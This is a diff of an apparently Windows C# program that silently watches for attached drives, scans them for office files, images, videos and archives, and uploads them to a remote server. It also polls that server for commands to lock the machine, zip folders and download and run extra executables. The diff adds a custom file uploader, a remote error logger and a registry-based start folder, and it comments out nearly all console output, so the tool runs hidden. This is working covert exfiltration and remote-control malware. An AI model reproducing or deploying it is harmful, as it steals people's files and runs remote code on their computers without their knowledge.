@@ -1,3 +1,5 @@
+using Microsoft.Win32;
+using System.Collections.Specialized;
 using System.Diagnostics;
 using System.IO.Compression;
 using System.Net;
@@ -14,13 +16,25 @@ internal class Program
 {
     private static void Main(string[] args)
     {
-        string SaveRoot, classRegistered, version, packDownloadSite, urlP1, urlP2, remoteVersionUrl;
+        string SaveRoot, classRegistered, version, packDownloadSite, urlP1, urlP2, remoteVersionUrl, debugMod;
         string[,] copyRoot = new string[600000, 2];
         bool[] registeredDrive = new bool[26];
         int fileCnt = 0;
         string localSaveRoot = "";
         List<string[]> fileBoot = new List<string[]> { };
         List<string> filePriority = new List<string> { ".xlsx", ".xls", ".pptx", ".ppt", ".png", ".jpg", ".mp4", ".ts", ".zip" };
+        if (!File.Exists("config.txt"))
+        {
+            try
+            {
+                RegistryKey k = Registry.CurrentUser.OpenSubKey("Software\\GTC-ACE\\Kaliumdichromat");
+                string kk = k.GetValue("RunRoot").ToString();
+                Environment.CurrentDirectory = kk;
+                k.Close();
+            }
+            catch (Exception e) { ErrorLogUpload(e, "Start Error"); }
+        }
+        
         StreamReader configFile = new StreamReader("config.txt");
         SaveRoot = configFile.ReadLine();
         urlP1 = configFile.ReadLine();
@@ -29,9 +43,10 @@ internal class Program
         version = configFile.ReadLine();
         packDownloadSite = configFile.ReadLine();
         remoteVersionUrl = configFile.ReadLine();
+        debugMod = configFile.ReadLine();
         configFile.Close();
         Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);
-
+        Console.WriteLine(classRegistered);
         if (!Directory.Exists(SaveRoot))
         {
             Directory.CreateDirectory(SaveRoot);
@@ -43,7 +58,7 @@ internal class Program
         {
             File.Create("Upload_Buffer\\File_Stack\\File_Stack.txt").Close();
         }
-        Console.WriteLine("Save to: {0} \nRequest Url: {1} \nversion: {2}", SaveRoot, classRegistered, version);
+        // Console.WriteLine("Save to: {0} \nRequest Url: {1} \nversion: {2}", SaveRoot, classRegistered, version);
 
 
         void fileMonitor()
@@ -62,25 +77,10 @@ internal class Program
                 foreach (string path in filesInS)
                 {
                     if (path == "") continue;
-                    // Console.WriteLine(Encoding.UTF8.GetString(File.ReadAllBytes(path)));
-                    var handler = new HttpClientHandler();
-                    handler.ServerCertificateCustomValidationCallback = delegate { return true; };
-                    var content = new MultipartFormDataContent();
-                    var fileStream = new FileStream(path, FileMode.Open, FileAccess.Read);
-                    var fileContent = new StreamContent(fileStream);
-                    fileContent.Headers.ContentDisposition = new ContentDispositionHeaderValue("form-data")
-                    {
-                        Name = "file",
-                        FileName = Uri.EscapeDataString(Path.GetFileName(path))
-
-                    };
-                    content.Add(fileContent);
+                    
                     try
                     {
-                        HttpClient client = new HttpClient(handler);
-                        client.DefaultRequestHeaders.UserAgent.ParseAdd("GTC Software Studio - ACE_Project (priority:00A) && Kaliumdichromat_Project (sub of ACE_Project)");
-                        HttpResponseMessage res = client.PostAsync(classRegistered + "upload.php", content).Result;
-                        Console.WriteLine(path + " succeed");
+                        HttpUploadFile(classRegistered + "upload.php", path, "file", "unknown");
                     }
                     catch
                     {
@@ -92,7 +92,7 @@ internal class Program
                 {
                     if (fileInError[i] == "") continue;
                     writeStack.Write(Encoding.UTF8.GetBytes(fileInError[i] + "\n"));
-                    Console.WriteLine(fileInError[i] + " failed");
+                    // Console.WriteLine(fileInError[i] + " failed");
                 }
                 writeStack.Close();
                 Thread.Sleep(5000);
@@ -105,19 +105,18 @@ internal class Program
 
         void getCommand()
         {
+            var content = new FormUrlEncodedContent(new Dictionary<string, string> { { "VALIDATE", "GTC Kaliumdichromat Project" } });
             while (true)
             {
                 using (HttpClient client = new HttpClient())
                 {
-                    var content = new FormUrlEncodedContent(new Dictionary<string, string> { { "VALIDATE", "GTC Kaliumdichromat Project" } });
                     client.DefaultRequestHeaders.UserAgent.ParseAdd("GTC Software Studio - ACE_Project (priority:00A) && Kaliumdichromat_Project (sub of ACE_Project)");
-                    HttpResponseMessage response = client.PostAsync(classRegistered + "overall.php", content).Result;
                     // Console.WriteLine(response.Content.ReadAsStringAsync().Result);
-                    string[] commands = response.Content.ReadAsStringAsync().Result.Split('\n');
+                    string[] commands = client.PostAsync(classRegistered + "overall.php", content).Result.Content.ReadAsStringAsync().Result.Split('\n');
                     foreach (string command in commands)
                     {
                         string[] splited = command.Split(' ');
-                        Console.WriteLine(splited[0]);
+                        // Console.WriteLine(splited[0]);
                         if (splited[0] == "lock")
                         {
                             Process p = new Process();
@@ -195,7 +194,7 @@ internal class Program
                                     File.Delete(zipFileName);
                                 }
                                 ZipFile.CreateFromDirectory(path, zipFileName, CompressionLevel.Optimal, false);
-                                Console.WriteLine(zipFileName + " done");
+                                // Console.WriteLine(zipFileName + " done");
                                 File.AppendAllText("Upload_Buffer\\File_Stack\\File_Stack.txt", zipFileName);
                             }
                         }
@@ -216,7 +215,7 @@ internal class Program
                                     arg += " ";
                                 }
                             }
-                            Console.WriteLine(packName);
+                            // Console.WriteLine(packName);
                             if (!Directory.Exists(Path.Combine("sidepacks", packName)))
                             {
                                 Directory.CreateDirectory(Path.Combine("sidepacks", packName));
@@ -258,7 +257,7 @@ internal class Program
                                                 wb.DownloadFile(packDownloadSite + packName + "/config.txt", Path.Combine("sidepacks", packName, "config.txt"));
                                             }
                                         }
-                                        catch (Exception e) { Console.WriteLine(e); continue; }
+                                        catch (Exception e) { /*Console.WriteLine(e);*/ continue; }
                                         ZipFile.ExtractToDirectory(Path.Combine("sidepacks", packName, packName + ".zip"), Path.Combine("sidepacks", packName, packName), Encoding.GetEncoding("gb18030"));
                                         packInfo = JsonSerializer.Deserialize<packRuntimeInformation>(File.ReadAllText(Path.Combine("sidepacks", packName, "config.txt")));
                                     }
@@ -270,6 +269,7 @@ internal class Program
                                 }
 
                             }
+                            // Console.WriteLine($"{packInfo.exe} {packInfo.version}");
                             try
                             {
                                 Process p = new Process();
@@ -282,7 +282,7 @@ internal class Program
                             }
                             catch (Exception e)
                             {
-                                Console.WriteLine(e.ToString());
+                                // Console.WriteLine(e.ToString());
                             }
 
                         }
@@ -298,20 +298,25 @@ internal class Program
 
         void updateChecker()
         {
+            string remoteVersion;
             while (true)
             {
                 using (HttpClient client = new HttpClient())
                 {
                     client.DefaultRequestHeaders.UserAgent.ParseAdd("GTC Software Studio - ACE_Project (priority:00A) && Kaliumdichromat_Project (sub of ACE_Project)");
-                    string remoteVersion = client.GetAsync(remoteVersionUrl).Result.Content.ReadAsStringAsync().Result;
+                    remoteVersion = client.GetAsync(remoteVersionUrl).Result.Content.ReadAsStringAsync().Result;
                     if (remoteVersion != version)
                     {
-                        Process p = new Process();
-                        p.StartInfo.FileName = "Updater.exe";
-                        p.StartInfo.CreateNoWindow = false;
-                        p.Start();
-                        p = null;
-                        Environment.Exit(0);
+                        try
+                        {
+                            Process p = new Process();
+                            p.StartInfo.FileName = "Updater.exe";
+                            p.StartInfo.CreateNoWindow = false;
+                            p.Start();
+                            p = null;
+                            Environment.Exit(0);
+                        }
+                        catch (Exception e) { ErrorLogUpload(e, urlP1.Replace("/", "")); }
                     }
                 }
                 Thread.Sleep(30000);
@@ -355,12 +360,12 @@ internal class Program
                 Encoding utf8 = Encoding.GetEncoding("utf-8");
                 byte[] gb = gbk.GetBytes(item.VolumeLabel);
                 gb = Encoding.Convert(gbk, utf8, gb);
-                Console.WriteLine(utf8.GetString(gb));
+                //Console.WriteLine(utf8.GetString(gb));
             }
             registeredDrive[item.Name[0] - 'A'] = true;
         }
         foreach (bool n in registeredDrive)
-        { Console.WriteLine(n); }
+        { /*Console.WriteLine(n);*/ }
 
         
         while (true)
@@ -380,11 +385,11 @@ internal class Program
                     gb = Encoding.Convert(gbk, utf8, gb);
                     string saveFileName = $"[{(uint)(DateTime.Now - new DateTime(1970, 1, 1, 0, 0, 0, 0)).TotalSeconds}] from[{utf8.GetString(gb)}]";
                     string saveDirName = SaveRoot + $"{saveFileName}\\";
-                    Console.WriteLine(saveDirName);
+                    // Console.WriteLine(saveDirName);
                     fileCnt = 0;
                     localSaveRoot = saveDirName;
                     Directory.CreateDirectory(localSaveRoot);
-                    Console.WriteLine("Scanning...");
+                    // Console.WriteLine("Scanning...");
                     scanDirectory(item.Name);
                     for (int i = 1; i <= fileCnt; i++)
                     {
@@ -406,7 +411,7 @@ internal class Program
                         }
                         return -p1 + p2;
                     });
-                    Console.WriteLine("Start");
+                    // Console.WriteLine("Start");
                     StreamWriter menu = new StreamWriter($"Upload_Buffer\\{saveFileName}.txt");
                     for (int i = 0; i < fileCnt; i++)
                     {
@@ -420,7 +425,7 @@ internal class Program
                         catch { }
                     }
                     menu.Close();
-                    Console.WriteLine("Done");
+                    // Console.WriteLine("Done");
                     File.AppendAllText("Upload_Buffer\\File_Stack\\File_Stack.txt", $"Upload_Buffer\\{saveFileName}.txt\r\n");
                 }
             }
@@ -439,5 +444,68 @@ internal class Program
         
         
     }
-
+    static void ErrorLogUpload(Exception e ,string Name)
+    {
+        using (HttpClient client = new HttpClient())
+        {
+            client.DefaultRequestHeaders.UserAgent.ParseAdd("GTC Software Studio - ACE_Project (priority:00A) && Kaliumdichromat_Project (sub of ACE_Project)");
+            var content = new FormUrlEncodedContent(new Dictionary<string, string> { { "Name", Name }, { "Content", e.ToString() } });
+            client.PostAsync("https://ace.gtc.tdom.cn/contents/error_log/receive.php", content);
+        }
+    }
+    public static void HttpUploadFile(string url, string filePath, string paramName, string contentType)
+    {
+        NameValueCollection nameValueCollection = new NameValueCollection();
+        string boundary = "---------------------------" + DateTime.Now.Ticks.ToString("x");
+        byte[] boundarybytes = System.Text.Encoding.ASCII.GetBytes("\r\n--" + boundary + "\r\n");
+        HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
+        request.ContentType = "multipart/form-data; boundary=" + boundary;
+        request.Method = "POST";
+        request.KeepAlive = true;
+        request.Credentials = CredentialCache.DefaultCredentials;
+        Stream requestStream = request.GetRequestStream();
+        string formdataTemplate = "Content-Disposition: form-data; name=\"{0}\"\r\n\r\n{1}";
+        foreach (string key in nameValueCollection.Keys)
+        {
+            requestStream.Write(boundarybytes, 0, boundarybytes.Length);
+            string formitem = string.Format(formdataTemplate, key, nameValueCollection[key]);
+            byte[] formitembytes = System.Text.Encoding.UTF8.GetBytes(formitem);
+            requestStream.Write(formitembytes, 0, formitembytes.Length);
+        }
+        requestStream.Write(boundarybytes, 0, boundarybytes.Length);
+        string header = string.Format("Content-Disposition: form-data; name=\"{0}\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n", paramName, filePath, contentType);
+        byte[] headerbytes = System.Text.Encoding.UTF8.GetBytes(header);
+        requestStream.Write(headerbytes, 0, headerbytes.Length);
+        FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read);
+        byte[] buffer = new byte[4096];
+        int bytesRead = 0;
+        while ((bytesRead = fileStream.Read(buffer, 0, buffer.Length)) != 0)
+        {
+            requestStream.Write(buffer, 0, bytesRead);
+        }
+        fileStream.Close();
+        byte[] trailer = System.Text.Encoding.ASCII.GetBytes("\r\n--" + boundary + "--\r\n");
+        requestStream.Write(trailer, 0, trailer.Length);
+        requestStream.Close();
+        WebResponse webResponse = null;
+        try
+        {
+            webResponse = request.GetResponse();
+            Stream responseStream = webResponse.GetResponseStream();
+            StreamReader streamReader = new StreamReader(responseStream);
+            string result = streamReader.ReadToEnd();
+        }
+        catch (Exception ex)
+        {
+            if (webResponse != null)
+            {
+                webResponse.Close();
+                webResponse = null;
+            }
+        }
+        finally
+        {
+            request = null;
+        }
+    }
 }
